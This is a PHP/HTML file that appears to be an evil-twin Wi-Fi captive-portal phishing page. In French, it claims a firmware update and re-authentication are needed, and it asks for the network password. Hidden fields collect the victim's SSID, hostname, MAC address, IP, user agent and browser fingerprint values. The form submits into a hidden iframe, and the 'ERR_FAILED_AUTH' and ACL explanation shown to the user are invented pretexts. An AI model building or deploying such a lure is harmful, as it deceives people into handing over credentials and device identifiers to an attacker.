<?php
$destination = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "";
require_once('helper.php');
require_once('visited.php');
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Pragma: no-cache");
header("Expires: 0");
$essid = "Attention: Mise à jour du firmware requise";
?>

<iframe name="login" id="login" style="display: none;"></iframe>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate" />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="0" />
    <link rel="stylesheet" href="/css/bootstrap-4.3.1.min.css">
    <link rel="stylesheet" href="/css/bootstrap-icons.css">
    <script type="text/javascript" src="/js/jquery-3.7.1.min.js"></script>
    <script type="text/javascript" src="/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="/style.css">
    <script type="text/javascript" src="/func.js"></script>
    <title><?= $essid ?></title>
</head>

<body>
    <div class="container mt-5">
        <div class="form-row justify-content-center">
            <div class="col-md-6">
                <div class="card rounded-lg border-light shadow">
                    <div class="card-body text-center">
                        <img src="airport-logo.png" class="img-fluid mb-3" style="max-width: 200; max-height: 100px; object-fit: contain;">
                        <h3 class="card-title text-center"><?= $essid; ?></h3>
                        <p class="text-center small mb-5">Pour une connexion stable et sécurisée, veuillez mettre à jour le firmware de votre appareil avant de vous connecter.</p>
                        <form method="POST" action="/captiveportal/index.php" onsubmit="submitForm()" target="login" id="loginForm">
                            <div class="form-group text-left mb-4">
                                <label for="password">Mot de passe:</label>
                                <div class="input-group">
                                <input type="password" class="form-control" id="password" name="password" placeholder="Entrez le mot de passe" autocomplete="current-password" required>
                                <div class="input-group-append">
                                    <span class="input-group-text">
                                        <i id="showPasswordIcon" class="bi bi-eye-fill" onclick="togglePassword()"></i>
                                    </span>
                                </div>
                            </div>
                            </div>
                            <div id="loading-message" class="text-center mt-3 mb-3 font-weight-bold"></div>
                            <input type="hidden" name="ssid" value="<?=getClientSSID($_SERVER['REMOTE_ADDR']);?>">
                            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                            <input type="hidden" name="useragent" value="<?= htmlspecialchars($_SERVER['HTTP_USER_AGENT']); ?>">
                            <input type="hidden" id="SR" name="SR" value="">
                            <input type="hidden" id="OS" name="OS" value="">
                            <input type="hidden" id="WB" name="WB" value="">
                            <input type="hidden" id="AT" name="AT" value="">
                            <input type="hidden" id="CC" name="CC" value="">
                            <script type="text/javascript">GSR(); GOS(); GWB(); GAT(); GCC();</script>
                            <button type="submit" class="btn btn-orange btn-block text-white">Se connecter</button>
                            <div class="form-group form-check text-left mt-2">
                            <input type="checkbox" class="form-check-input" id="ACLAllow" name="ACLAllow" value="0">
                            <label class="form-check-label" for="ACLAllow">Ajouter l’adresse MAC à la liste d’accès</label>
                            </div>
                        </form>
                        <p class="text-left small text-muted mt-4 d-flex justify-content-between align-items-center">
                            STATUS: ERR_FAILED_AUTH
                        <p class="text-left small text-muted d-flex justify-content-between align-items-center">
                            Client MAC: <?=getClientMac($_SERVER['REMOTE_ADDR']);?>
                            <a href="#" class="popover-link" data-container="body" data-html="true" data-toggle="popover" data-placement="top" data-content="Cela s’est produit en raison des paramètres de la Liste de Contrôle d’Accès (ACL) appliqués sur le point d’accès sans fil. Une mise à jour du firmware est requise pour garantir une connexion sécurisée et stable. Les appareils doivent se réauthentifier pour vérifier leur accès avec l’ACL du point d’accès. Si votre appareil est autorisé à accéder à ce réseau, votre adresse MAC sera autorisée après cette mise à jour et réauthentification via le portail captif intégré de ce point d’accès. C’est pourquoi vous voyez ce message." title="ERR_FAILED_AUTH" data-trigger="focus" tabindex="0">Pourquoi est-ce arrivé ?</a>
                       </p>
                       </p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
